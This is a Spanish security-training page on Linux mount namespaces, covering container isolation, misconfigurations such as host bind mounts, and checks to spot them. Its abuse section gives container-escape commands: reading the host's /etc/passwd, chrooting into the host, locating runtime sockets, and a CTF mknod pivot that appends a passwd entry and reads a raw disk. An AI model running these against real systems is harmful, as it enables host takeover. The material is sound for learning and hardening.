# Espacio de nombres de montaje

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres de montaje controla la **tabla de montajes** que ve un proceso. Esta es una de las características de aislamiento de contenedores más importantes porque el sistema de ficheros raíz, los bind mounts, los montajes tmpfs, la vista de procfs, la exposición de sysfs y muchos montajes auxiliares específicos del runtime se expresan a través de esa tabla de montajes. Dos procesos pueden acceder ambos a `/`, `/proc`, `/sys` o `/tmp`, pero a qué corresponden esas rutas depende del espacio de nombres de montaje en el que estén.

Desde la perspectiva de la seguridad de contenedores, el espacio de nombres de montaje suele ser la diferencia entre "este es un sistema de ficheros de aplicación perfectamente preparado" y "este proceso puede ver o influir directamente en el sistema de ficheros del host". Por eso los bind mounts, los volúmenes `hostPath`, las operaciones de montaje privilegiadas y las exposiciones con `/proc` o `/sys` escribibles giran en torno a este espacio de nombres.

## Funcionamiento

Cuando un runtime inicia un contenedor, normalmente crea un nuevo espacio de nombres de montaje, prepara un sistema de ficheros raíz para el contenedor, monta procfs y otros sistemas de ficheros auxiliares según sea necesario, y luego opcionalmente añade bind mounts, montajes tmpfs, secrets, config maps o host paths. Una vez que ese proceso está ejecutándose dentro del espacio de nombres, el conjunto de montajes que ve queda en gran medida desacoplado de la vista por defecto del host. El host puede seguir viendo el sistema de ficheros subyacente real, pero el contenedor ve la versión ensamblada para él por el runtime.

Esto es poderoso porque permite que el contenedor piense que tiene su propio sistema de ficheros raíz aunque el host siga gestionando todo. También es peligroso porque si el runtime expone un montaje incorrecto, el proceso de repente gana visibilidad sobre recursos del host que el resto del modelo de seguridad puede no haber sido diseñado para proteger.

## Laboratorio

Puedes crear un espacio de nombres de montaje privado con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si abres otra shell fuera de ese namespace y examinas la mount table, verás que el tmpfs mount existe solo dentro del isolated mount namespace. Esto es un ejercicio útil porque muestra que mount isolation no es una teoría abstracta; el kernel está literalmente presentando una mount table diferente al proceso.
Si abres otra shell fuera de ese namespace y examinas la mount table, el tmpfs mount existirá solo dentro del isolated mount namespace.

Dentro de containers, una comparación rápida es:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
El segundo ejemplo demuestra lo fácil que es para una configuración en tiempo de ejecución abrir un gran agujero en la frontera del sistema de archivos.

## Uso en tiempo de ejecución

Docker, Podman, containerd-based stacks, y CRI-O dependen de un namespace de montaje privado para contenedores normales. Kubernetes reutiliza el mismo mecanismo para volumes, projected secrets, config maps y montajes `hostPath`. Los entornos Incus/LXC también dependen mucho de los namespace de montaje, especialmente porque los contenedores de sistema suelen exponer sistemas de archivos más ricos y parecidos a los de una máquina que los contenedores de aplicación.

Esto significa que cuando revisas un problema del filesystem de un contenedor, normalmente no estás viendo una rareza aislada de Docker. Estás viendo un problema de namespace de montaje y configuración en tiempo de ejecución expresado a través de la plataforma que lanzó la carga de trabajo.

## Configuraciones incorrectas

El error más obvio y peligroso es exponer el sistema de archivos root del host u otra ruta sensible del host mediante un bind mount, por ejemplo `-v /:/host` o un `hostPath` escribible en Kubernetes. En ese punto, la pregunta ya no es "¿puede el contenedor escapar de alguna manera?" sino "¿cuánto contenido útil del host ya está directamente visible y escribible?" Un bind mount escribible del host a menudo convierte el resto del exploit en una cuestión sencilla de colocación de archivos, chrooting, modificación de la configuración o descubrimiento de sockets en tiempo de ejecución.

Otro problema común es exponer `/proc` o `/sys` del host de formas que evaden la vista más segura del contenedor. Estos sistemas de archivos no son montajes de datos ordinarios; son interfaces al estado del kernel y de los procesos. Si la carga de trabajo accede directamente a las versiones del host, muchas de las suposiciones detrás del hardening de contenedores dejan de aplicarse limpiamente.

Las protecciones de solo lectura también importan. Un sistema de archivos root en solo lectura no asegura mágicamente un contenedor, pero elimina una gran cantidad de espacio de preparación para el atacante y dificulta la persistencia, la colocación de binarios auxiliares y la manipulación de la configuración. Por el contrario, un root escribible o un bind mount escribible del host le da al atacante espacio para preparar el siguiente paso.

## Abuso

Cuando se abusa del namespace de montaje, los atacantes suelen hacer una de cuatro cosas. Ellos **leer datos del host** que deberían haber permanecido fuera del contenedor. Ellos **modificar la configuración del host** mediante bind mounts escribibles. Ellos **montar o remontar recursos adicionales** si las capabilities y seccomp lo permiten. O ellos **alcanzar sockets potentes y directorios de estado en tiempo de ejecución** que les permiten pedirle a la plataforma de contenedores más acceso.

Si el contenedor ya puede ver el sistema de archivos del host, el resto del modelo de seguridad cambia de inmediato.

Cuando sospeches un bind mount del host, primero confirma qué está disponible y si es escribible:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si el sistema de archivos raíz del host está montado en modo lectura-escritura, el acceso directo al host suele ser tan sencillo como:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si el objetivo es acceso privilegiado en tiempo de ejecución en lugar de chrooting directo, enumera sockets y el estado en tiempo de ejecución:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` está presente, prueba también si se pueden crear nuevos mounts desde dentro del container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Ejemplo completo: Two-Shell `mknod` Pivot

Surge una vía de abuso más especializada cuando el usuario root del container puede crear block devices, el host y el container comparten una identidad de usuario de forma útil, y el attacker ya tiene un foothold de bajos privilegios en el host. En esa situación, el container puede crear un device node como `/dev/sda`, y el usuario del host con pocos privilegios puede luego leerlo a través de `/proc/<pid>/root/` para el proceso del container correspondiente.

Dentro del container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Desde el host, como el usuario de bajos privilegios correspondiente, después de localizar el PID del shell del contenedor:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lección importante no es la búsqueda exacta de cadenas de un CTF. Es que la exposición del mount-namespace a través de `/proc/<pid>/root/` puede permitir que un usuario del host reutilice nodos de dispositivo creados por el contenedor incluso cuando la política de dispositivos de cgroup impedía su uso directo desde dentro del propio contenedor.

## Comprobaciones

Estos comandos están ahí para mostrarte la vista del sistema de archivos en la que el proceso actual realmente vive. El objetivo es detectar montajes procedentes del host, rutas sensibles escribibles y cualquier cosa que parezca más amplia que el sistema de archivos raíz normal de un contenedor de aplicación.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Qué es interesante aquí:

- Los bind mounts desde el host, especialmente `/`, `/proc`, `/sys`, directorios de estado en tiempo de ejecución, o ubicaciones de sockets, deberían destacar inmediatamente.
- Los read-write mounts inesperados suelen ser más importantes que un gran número de read-only helper mounts.
- `mountinfo` suele ser el mejor lugar para ver si una ruta es realmente host-derived o overlay-backed.

Estas comprobaciones establecen **which resources are visible in this namespace**, **which ones are host-derived**, y **which of them are writable or security-sensitive**.
{{#include ../../../../../banners/hacktricks-training.md}}
